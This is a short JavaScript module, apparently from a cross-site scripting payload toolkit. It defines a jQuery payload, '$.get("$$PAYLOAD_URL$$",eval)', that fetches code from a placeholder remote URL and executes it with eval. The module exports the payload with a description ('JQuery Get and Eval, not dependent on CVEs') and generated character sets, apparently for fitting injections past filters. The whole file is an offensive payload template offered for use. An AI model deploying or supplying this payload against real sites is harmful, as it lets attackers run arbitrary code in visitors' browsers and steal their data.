import generateCharsets from '../lib/charsets/generate.js'
import renderable from '../lib/renderable.js'

const script = '$.get("$$PAYLOAD_URL$$",eval)'

export default {
    description: `JQuery Get and Eval, not dependent on CVEs`,
    script: renderable(script),
    charsets: generateCharsets(script)
}

